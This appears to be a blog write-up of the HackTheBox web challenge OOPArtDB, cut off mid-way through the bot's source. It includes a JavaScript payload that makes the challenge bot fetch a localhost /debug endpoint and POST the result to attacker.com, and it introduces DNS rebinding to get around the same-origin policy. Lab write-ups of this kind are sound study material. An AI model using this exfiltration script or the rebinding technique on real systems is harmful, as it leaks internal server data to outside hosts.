@@ -1,0 +1,330 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Hardest challenge on HTB"><title>HTB Insane Web OOPArtDB</title>
+<link rel=canonical href=https://Kvn11.github.io/p/htb-insane-web-oopartdb/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="HTB Insane Web OOPArtDB"><meta property='og:description' content="Hardest challenge on HTB"><meta property='og:url' content='https://Kvn11.github.io/p/htb-insane-web-oopartdb/'><meta property='og:site_name' content='Kvn11'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='web'><meta property='article:tag' content='htb'><meta property='article:tag' content='insane'><meta property='article:published_time' content='2024-02-20T02:45:01-07:00'><meta property='article:modified_time' content='2024-02-20T02:45:01-07:00'><meta property='og:image' content='https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/hackthebox.jpg'><meta name=twitter:title content="HTB Insane Web OOPArtDB"><meta name=twitter:description content="Hardest challenge on HTB"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/hackthebox.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hudbb421f81ae9f6f59107818afbf2d835_34334_300x0_resize_q75_box.JPG width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Kvn11</a></h1><h2 class=site-description>Trying to become IRL netrunner</h2></div></header><ol class=menu-social><li><a href=https://github.com/Kvn11 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#intro>Intro</a></li><li><a href=#foothold>Foothold</a><ol><li><a href=#cors>CORS</a></li><li><a href=#sop>SOP</a></li><li><a href=#bypass-1>Bypass 1</a></li><li><a href=#bypass-2>Bypass 2</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/htb-insane-web-oopartdb/><img src=/p/htb-insane-web-oopartdb/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_800x0_resize_q75_box.jpg srcset="/p/htb-insane-web-oopartdb/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_800x0_resize_q75_box.jpg 800w, /p/htb-insane-web-oopartdb/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_1600x0_resize_q75_box.jpg 1600w" width=800 height=450 loading=lazy alt="Featured image of post HTB Insane Web OOPArtDB"></a></div><div class=article-details><header class=article-category><a href=/categories/hackthebox/>HackTheBox</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-insane-web-oopartdb/>HTB Insane Web OOPArtDB</a></h2><h3 class=article-subtitle>Hardest challenge on HTB</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Feb 20, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><h2 id=intro>Intro</h2><p>This challenge allows you to submit a URL to be &ldquo;scanned&rdquo; by a bot on the challenge server.
+The flag is shown in the webapp once you have successfully accessed the appropriate page with the credentials of the &ldquo;Overseer&rdquo; user.</p><h2 id=foothold>Foothold</h2><p>One of the first things I noticed in the source code, was the <code>/debug</code> and <code>/register</code> endpoint.
+The <code>/debug</code> endpoint caught my attention because it could reveal the secret <code>REFERRAL_TOKEN</code> value which is required to register via <code>/register</code> as the higher privilege <code>researcher</code> type of user.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// challenge/index.js
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/debug&#34;</span><span class=p>,</span> <span class=nx>util</span><span class=p>.</span><span class=nx>isLocalhost</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>utils</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;util&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=nb>Object</span><span class=p>.</span><span class=nx>getOwnPropertyNames</span><span class=p>(</span><span class=nx>global</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>map</span><span class=p>(</span><span class=nx>n</span> <span class=p>=&gt;</span> <span class=sb>`</span><span class=si>${</span><span class=nx>n</span><span class=si>}</span><span class=sb>:\n</span><span class=si>${</span><span class=nx>utils</span><span class=p>.</span><span class=nx>inspect</span><span class=p>(</span><span class=nx>global</span><span class=p>[</span><span class=nx>n</span><span class=p>])</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;\n\n&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><p>When accessed via a GET request from localhost, it responds with a detailed inspection of all properties of the global object in Node.js.
+It&rsquo;s a way to inspect the global environment for debugging purposes.
+In all honesty, at this point I couldn&rsquo;t see how I could leverage this to get the flag, but it seemed like a good step up since I was obtaining higher permissions.
+This is probably something I need to work on for the future.
+This is clearly SSRF, but we can&rsquo;t see the output of the response, so we also need to combine it with a way to exfiltrate the response.
+So then my next thought was to submit a URL I control.
+The URL will contain a webpage that contains a script that will make a request to the <code>/debug</code> endpoint, and then submit the response from that request back to my own web server.</p><p>I hosted a web page on an EC2 instance, and had the following script run on it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>fetchData</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;http://localhost/debug&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>response</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>response</span><span class=p>.</span><span class=nx>ok</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Network response was not ok&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>response</span><span class=p>.</span><span class=nx>text</span><span class=p>();</span> <span class=c1>// Return the response as text
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=k>catch</span><span class=p>(</span><span class=nx>error</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Error fetching data:&#39;</span><span class=p>,</span> <span class=nx>error</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Function to send a POST request to `http://attacker.com/` with the fetched data after a delay of 3 seconds
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>function</span> <span class=nx>sendDataWithDelay</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;http://attacker.com/&#39;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>headers</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=o>:</span> <span class=s1>&#39;text/plain&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=p>},</span>
+</span></span><span class=line><span class=cl>      <span class=nx>body</span><span class=o>:</span> <span class=nx>data</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>response</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>response</span><span class=p>.</span><span class=nx>ok</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Network response was not ok&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Data sent successfully&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=k>catch</span><span class=p>(</span><span class=nx>error</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Error sending data:&#39;</span><span class=p>,</span> <span class=nx>error</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl>  <span class=p>},</span> <span class=mi>3000</span><span class=p>);</span> <span class=c1>// Delay of 3 seconds (3000 milliseconds)
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Usage: Fetch data and then send it after a delay of 3 seconds
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>fetchData</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>data</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>sendDataWithDelay</span><span class=p>(</span><span class=nx>data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><p>This somewhat worked, but I wasn&rsquo;t able to receive the request to exfil.</p><p><img src=/p/htb-insane-web-oopartdb/img/2.png width=681 height=54 srcset="/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_1024x0_resize_box_3.png 1024w" loading=lazy alt="First request received" class=gallery-image data-flex-grow=1261 data-flex-basis=3026px></p><p>This request could have gotten blocked due to the CORS policy, and upon some research it seemed that <code>http.server</code> does not allow controlling the <code>CORS</code> header from the commandline.
+However, it is possible with a little scripting and help from <a class=link href=https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server target=_blank rel=noopener>stackoverflow</a></p><p>Then we can verify it worked with burpsuite.
+I blurred out the IP address of my EC2 instance since I don&rsquo;t want it getting touched :).</p><p><img src=/p/htb-insane-web-oopartdb/img/3.png width=991 height=344 srcset="/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_1024x0_resize_box_3.png 1024w" loading=lazy alt="Initial Request" class=gallery-image data-flex-grow=288 data-flex-basis=691px> <img src=/p/htb-insane-web-oopartdb/img/4.png width=588 height=195 srcset="/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_1024x0_resize_box_3.png 1024w" loading=lazy alt="Response with CORS policy" class=gallery-image data-flex-grow=301 data-flex-basis=723px> <img src=/p/htb-insane-web-oopartdb/img/5.png width=944 height=367 srcset="/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_1024x0_resize_box_3.png 1024w" loading=lazy alt="Request to /debug" class=gallery-image data-flex-grow=257 data-flex-basis=617px> <img src=/p/htb-insane-web-oopartdb/img/6.png width=550 height=103 srcset="/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_1024x0_resize_box_3.png 1024w" loading=lazy alt="Request to /debug received" class=gallery-image data-flex-grow=533 data-flex-basis=1281px></p><p>However, the POST request never went out.
+This was again due to the CORS policy on my local <code>http.server</code> not havint the correct value, which then made me look into what the CORS and CSP policy was on the actual challenge.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// no XSS or iframing :&gt;
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span><span class=s2>&#34;Content-Security-Policy&#34;</span><span class=p>,</span> <span class=sb>`
+</span></span></span><span class=line><span class=cl><span class=sb>        default-src &#39;self&#39;;
+</span></span></span><span class=line><span class=cl><span class=sb>        style-src &#39;self&#39; https://fonts.googleapis.com;
+</span></span></span><span class=line><span class=cl><span class=sb>        font-src https://fonts.gstatic.com;
+</span></span></span><span class=line><span class=cl><span class=sb>        object-src &#39;none&#39;;
+</span></span></span><span class=line><span class=cl><span class=sb>        base-uri &#39;none&#39;;
+</span></span></span><span class=line><span class=cl><span class=sb>        frame-ancestors &#39;none&#39;;
+</span></span></span><span class=line><span class=cl><span class=sb>    `</span><span class=p>.</span><span class=nx>trim</span><span class=p>().</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/\s+/g</span><span class=p>,</span> <span class=s2>&#34; &#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span><span class=s2>&#34;X-Frame-Options&#34;</span><span class=p>,</span> <span class=s2>&#34;DENY&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><p>I couldn&rsquo;t find anything to indicate what the CORS policy was so I assumed it was set as the default Same Origin Policy.
+My testing also implied this, so now is the time to think of how to bypass it.</p><h3 id=cors>CORS</h3><p>CORS is a policy defined by the web server that determines what requests it will accept.
+If you intercept a response from a web server with a CORS policy you will see the header:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Access-Control-Allow-Origin: *
+</span></span></code></pre></td></tr></table></div></div><p>This header can have multiple values to specify multiple domains, or a wildcard as shown above, or a <code>null</code> value.
+It makes sense too because a site that holds private information probably doesn&rsquo;t want to share information to applications outside of its domain.
+Anyways, there are 2 parts to CORS.
+There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request.
+However these only happen when non-standard requests are made I think, or when you need to read the headers or data of the response (TODO: Verify this)</p><h3 id=sop>SOP</h3><p>Same Origin Policy is similar to CORS, but it is enforced by the browser.
+This policy just makes it so that a client can only request resources from the same origin, that is the same: <strong>protocal</strong>, <strong>domain</strong>, and <strong>port</strong>.
+For example: a request from <a class=link href=https://foo.com target=_blank rel=noopener>https://foo.com</a> to <a class=link href=http://foo.com target=_blank rel=noopener>http://foo.com</a> wouldn&rsquo;t work because there is a different protocol between the two addresses.</p><h3 id=bypass-1>Bypass 1</h3><p>So the problem here is that our site, lets call it <code>http://attacker.com</code> is trying to make a request to <code>http://localhost/debug</code>, but because the domain, and the port are different then the request is not allowed by the bot&rsquo;s browser.</p><p>And our goal is for the bot to visit our page, our page sends a request to the local server address of the challenge site, and then our page posts that request to us at another endpoint.</p><p><img src=/p/htb-insane-web-oopartdb/img/7.png width=681 height=580 srcset="/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_1024x0_resize_box_3.png 1024w" loading=lazy alt="The problem becomes obvious" class=gallery-image data-flex-grow=117 data-flex-basis=281px></p><p>Enter DNS Rebind.
+While searching for bypasses on hacktricks, I came across this method.
+The attack relies on changing the IP address for a domain (rebinding it), very quickly, sort of like a race condition.
+How does that help us here?
+Well in the source code for the bot, we can see that it doensn&rsquo;t perform all its actions immediately, there are delays.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// challenge/bot.js
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>visit</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>url</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>browser</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>browser</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>puppeteer</span><span class=p>.</span><span class=nx>launch</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>            <span class=nx>headless</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>pipe</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>args</span><span class=o>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;--no-sandbox&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-setuid-sandbox&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;--js-flags=--noexpose_wasm,--jitless&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>],</span>
+</span></span><span class=line><span class=cl>            <span class=nx>dumpio</span><span class=o>:</span> <span class=kc>true</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>context</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>createIncognitoBrowserContext</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>page</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>context</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=s2>&#34;http://localhost/login&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>waitUntil</span><span class=o>:</span> <span class=s2>&#34;networkidle2&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>evaluate</span><span class=p>((</span><span class=nx>user</span><span class=p>,</span> <span class=nx>pass</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;input[name=user]&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>user</span><span class=p>;</span>
